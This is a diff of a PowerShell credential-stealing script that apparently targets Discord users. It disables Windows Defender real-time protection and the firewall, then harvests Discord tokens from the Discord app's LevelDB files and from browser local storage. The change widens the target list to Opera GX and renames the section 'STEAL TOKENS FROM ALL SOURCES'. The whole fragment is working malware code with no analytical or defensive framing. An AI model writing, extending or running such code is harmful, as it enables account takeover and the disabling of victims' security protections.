@@ -15,7 +15,7 @@ try {
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 netsh advfirewall set allprofiles state off > $null
 
-# === STEAL TOKENS FROM BROWSERS (WITHOUT SQLITE) ===
+# === STEAL TOKENS FROM ALL SOURCES ===
 $tokens = @()
 
 # 1. Discord App LevelDB
@@ -33,11 +33,12 @@ $tokens = @()
     }
 }
 
-# 2. Browser Local Storage (Chrome/Edge/Brave)
+# 2. Browser Local Storage (Chrome/Edge/Brave/OperaGX)
 $browsers = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
+    "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb"
 )
 
 foreach ($ldbPath in $browsers) {
